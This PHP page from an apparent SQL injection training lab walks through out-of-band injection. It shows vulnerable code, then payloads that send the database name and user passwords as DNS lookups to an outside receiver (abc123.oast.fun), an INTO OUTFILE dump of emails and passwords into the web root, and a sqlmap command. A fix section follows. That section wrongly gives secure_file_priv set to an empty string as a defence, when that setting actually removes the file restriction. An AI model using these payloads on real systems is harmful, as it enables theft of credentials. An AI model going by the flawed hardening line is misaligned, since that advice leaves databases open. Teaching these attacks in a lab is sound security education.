<?php if ( ! defined('SQL_INJECTION_IN_PHP') ) die('Direct access not permitted'); ?>

<nav aria-label="breadcrumb" class="mb-3">
  <ol class="breadcrumb">
    <li class="breadcrumb-item"><a href="?action=walkthroughs">Walkthroughs</a></li>
    <li class="breadcrumb-item active">Out-of-Band (OOB)</li>
  </ol>
</nav>

<div class="d-flex align-items-center gap-3 mb-4">
  <h2 class="mb-0">9. Out-of-Band (OOB) SQL Injection</h2>
  <span class="badge bg-warning text-dark">Advanced</span>
  <span class="badge bg-secondary">Exfiltration</span>
</div>

<div class="card mb-4">
  <div class="card-header bg-dark text-white"><strong>Overview</strong></div>
  <div class="card-body">
    <p>Out-of-Band injection exfiltrates data through a completely separate channel from the HTTP response — typically <strong>DNS lookups</strong> or <strong>HTTP requests</strong> initiated by the database server itself. The attacker's HTTP response is always identical — there is no timing difference, no error, no output.</p>
    <p>OOB is the most stealthy exfiltration technique. It works against fully hardened applications where in-band and time-based channels are both blocked. It requires the DB to have outbound network access and the <code>FILE</code> privilege.</p>
    <p class="mb-0"><strong>Affected file:</strong> <code>pages/oob.php</code> | <strong>Requires:</strong> MySQL FILE privilege + outbound DNS from the DB server</p>
  </div>
</div>

<div class="card mb-4 border-danger">
  <div class="card-header bg-danger text-white"><strong>Vulnerable Code</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$uid = $_GET['uid'] ?? '';

// Vulnerable — raw integer injection point
$sql = "SELECT id FROM user WHERE id = {$uid}";

// Errors suppressed, no output, no timing delay
$pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_SILENT);
$pdo->query($sql);

// Response is ALWAYS the same — only DNS/HTTP channel differs
echo "Done.";</code></pre>
  </div>
</div>

<div class="card mb-4 border-warning">
  <div class="card-header bg-warning text-dark"><strong>Attack Walkthrough — Step by Step</strong></div>
  <div class="card-body">

    <h6 class="fw-bold">Step 1 — Set up OOB receiver</h6>
    <p>You need a DNS server or Burp Collaborator to receive exfiltrated data.</p>
    <div class="row g-3 mb-3">
      <div class="col-md-6">
        <strong>Option A — interactsh (free):</strong>
        <pre class="bg-light p-2 rounded small">go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client
# Gives you: abc123.oast.fun</pre>
      </div>
      <div class="col-md-6">
        <strong>Option B — Burp Collaborator (Pro):</strong>
        <pre class="bg-light p-2 rounded small">Burp → Burp menu → Burp Collaborator client
→ "Copy to clipboard"
# Gives you: xyz.burpcollaborator.net</pre>
      </div>
    </div>

    <h6 class="fw-bold">Step 2 — Confirm OOB is possible</h6>
    <p>Send a ping payload and check your DNS receiver:</p>
    <pre class="bg-light p-2 rounded small">1 AND LOAD_FILE(concat('\\\\', 'confirm.abc123.oast.fun', '\\share'))</pre>
    <p class="small text-muted mb-3">If you see a DNS query for <code>confirm.abc123.oast.fun</code> in your receiver, OOB works.</p>

    <h6 class="fw-bold">Step 3 — Exfiltrate the database name via DNS</h6>
    <pre class="bg-light p-2 rounded small">1 AND LOAD_FILE(concat('\\\\', (SELECT database()), '.abc123.oast.fun', '\\x'))</pre>
    <p class="small text-muted mb-3">DNS query: <code>sql_demo.abc123.oast.fun</code> → database name revealed in your receiver.</p>

    <h6 class="fw-bold">Step 4 — Exfiltrate a password</h6>
    <pre class="bg-light p-2 rounded small">1 AND LOAD_FILE(concat('\\\\', (SELECT password FROM user LIMIT 1), '.abc123.oast.fun', '\\x'))</pre>
    <p class="small text-muted mb-3">Password appears as a DNS subdomain. Use hex encoding to handle special chars:</p>
    <pre class="bg-light p-2 rounded small">1 AND LOAD_FILE(concat('\\\\', hex((SELECT password FROM user LIMIT 1)), '.abc123.oast.fun', '\\x'))</pre>

    <h6 class="fw-bold">Step 5 — Write data to web root (alternate OOB)</h6>
    <pre class="bg-light p-2 rounded small">1 AND (SELECT email, password FROM user INTO OUTFILE '/var/www/html/leak.txt')</pre>
    <p class="small text-muted mb-3">If the DB has write access to web root: <code>http://target/leak.txt</code> contains the dump.</p>

    <h6 class="fw-bold">Step 6 — Automate with sqlmap</h6>
    <pre class="bg-light p-2 rounded small">sqlmap -u "http://localhost:8080/profile.php?action=oob&uid=1" \
  --technique=F --dns-domain=abc123.oast.fun \
  -D sql_demo -T user --dump --batch</pre>

    <a href="?action=oob" class="btn btn-sm btn-outline-warning">Open OOB Demo →</a>
  </div>
</div>

<div class="card mb-4 border-info">
  <div class="card-header bg-info text-white"><strong>Why OOB is So Dangerous</strong></div>
  <div class="card-body">
    <table class="table table-sm table-bordered small mb-0">
      <thead class="table-dark"><tr><th>Technique</th><th>HTTP Response</th><th>Errors Needed</th><th>Timing Signal</th><th>Works Through WAF</th></tr></thead>
      <tbody>
        <tr><td>UNION</td><td>Data visible</td><td>No</td><td>No</td><td>Sometimes</td></tr>
        <tr><td>Error-based</td><td>Error visible</td><td>Yes</td><td>No</td><td>Rare</td></tr>
        <tr><td>Blind Boolean</td><td>Binary diff</td><td>No</td><td>No</td><td>Sometimes</td></tr>
        <tr><td>Time-based</td><td>Identical</td><td>No</td><td>Yes</td><td>Sometimes</td></tr>
        <tr class="table-danger"><td><strong>OOB DNS</strong></td><td><strong>Identical</strong></td><td><strong>No</strong></td><td><strong>No</strong></td><td><strong>Yes</strong></td></tr>
      </tbody>
    </table>
  </div>
</div>

<div class="card mb-4 border-success">
  <div class="card-header bg-success text-white"><strong>Fix</strong></div>
  <div class="card-body">
<pre class="bg-light p-3 rounded"><code>$stmt = $pdo->prepare("SELECT id FROM user WHERE id = :id");
$stmt->execute([':id' => (int) $uid]);</code></pre>
    <p><strong>Infrastructure defences (defence-in-depth):</strong></p>
    <ul class="mb-0">
      <li>Revoke <code>FILE</code> privilege: <code>REVOKE FILE ON *.* FROM 'appuser'@'%';</code></li>
      <li>Set <code>secure_file_priv = ""</code> in <code>/etc/mysql/my.cnf</code></li>
      <li><strong>Block all outbound traffic from the DB server</strong> at the firewall level — the DB has no business initiating outbound DNS or HTTP connections</li>
    </ul>
  </div>
</div>
